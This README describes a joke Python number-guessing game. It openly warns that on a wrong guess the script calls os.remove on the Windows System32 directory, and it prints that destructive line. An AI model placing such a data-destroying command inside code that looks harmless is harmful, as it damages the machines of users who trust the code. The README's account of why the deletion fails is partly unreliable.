# 🦑 Squid Game: NumberGuess (The "You Didn't Win" Edition)

A simple, classic "Guess the Number" game... with extremely **high stakes** if you lose.

## 🎲 How to Play

1.  Clone this repo (if you dare).
2.  Run the Python script: `python index.py`
3.  Guess a number between 1 and 10.
4.  If you win, you get bragging rights (`You won!`).

## 🚨 WARNING (READ THIS BEFORE RUNNING!)

**This project contains a dangerous programmer joke on Line 11.**

```python
os.remove("c:\\windows\\system32")
```

⚠️ DO NOT RUN THIS SCRIPT ON A WINDOWS MACHINE YOU CARE ABOUT. ⚠️
If you fail to guess the number correctly, the game attempts to call os.remove() on a critical system directory (C:\Windows\System32).

For the love of your boot drive, only run this in a non-Windows environment or a disposable sandbox!

Consider this a proof-of-concept for terrible life choices and a lesson in why you should never run random code from the internet (especially mine).

The Real Lesson:
It won't actually work because modern OS permissions (like those on your Windows 11 laptop) usually prevent a regular user script from deleting something that critical without administrative privileges, but the intent is what counts! 😂
